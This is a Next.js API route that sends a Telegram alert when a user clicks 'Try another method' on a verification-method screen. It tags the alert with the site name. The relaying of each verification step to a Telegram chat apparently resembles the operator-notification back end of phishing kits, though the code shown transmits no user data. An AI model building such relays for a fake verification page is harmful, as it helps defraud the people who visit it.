import { NextResponse } from 'next/server';
import { sendTelegramMessage, getSiteName, wrapFlowMessage } from '@/lib/telegram';

function escapeHtml(s) {
  if (typeof s !== 'string') return '';
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

export async function POST(_request) {
  try {
    const message = [
      `🏷 Site: ${escapeHtml(getSiteName())}`,
      '',
      '↩️ <b>Try another method clicked</b>',
      'User returned to verification method selection.',
    ].join('\n');

    await sendTelegramMessage(wrapFlowMessage(message));
    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error('notify-try-another-method:', err);
    return NextResponse.json({ error: 'Notification failed' }, { status: 503 });
  }
}
